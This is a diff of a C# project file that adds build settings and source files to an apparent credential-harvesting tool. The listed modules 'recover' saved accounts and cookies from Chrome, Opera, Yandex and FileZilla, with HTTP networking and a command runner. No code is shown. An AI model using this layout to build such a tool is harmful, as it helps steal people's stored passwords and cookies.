@@ -32,27 +32,38 @@
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
   </PropertyGroup>
+  <PropertyGroup />
+  <PropertyGroup>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+  </PropertyGroup>
   <ItemGroup>
     <Reference Include="Microsoft.VisualBasic" />
     <Reference Include="System" />
     <Reference Include="System.Data" />
+    <Reference Include="System.Management" />
     <Reference Include="System.Security" />
+    <Reference Include="System.Web" />
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="Core\Commands\Run.cs" />
+    <Compile Include="Core\Data\Info.cs" />
     <Compile Include="Core\Network\Http.cs" />
+    <Compile Include="Core\Recovery\Browsers\Opera.cs" />
     <Compile Include="Core\Recovery\Browsers\Yandex.cs" />
     <Compile Include="Core\Recovery\Programs\FileZilla.cs" />
+    <Compile Include="Core\Recovery\Utilites\JsonUtil.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
     <Compile Include="Core\Recovery\Browsers\Chrome.cs" />
-    <Compile Include="Core\Recovery\Browsers\ChromiumBase.cs" />
+    <Compile Include="Core\Recovery\Utilites\ChromiumBase.cs" />
     <Compile Include="Core\Data\Cookie.cs" />
     <Compile Include="Core\Data\RecoveredAccount.cs" />
     <Compile Include="Core\Recovery\Utilites\SQLiteHandler.cs" />
   </ItemGroup>
   <ItemGroup>
     <None Include="App.config" />
+    <None Include="app.manifest" />
   </ItemGroup>
   <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
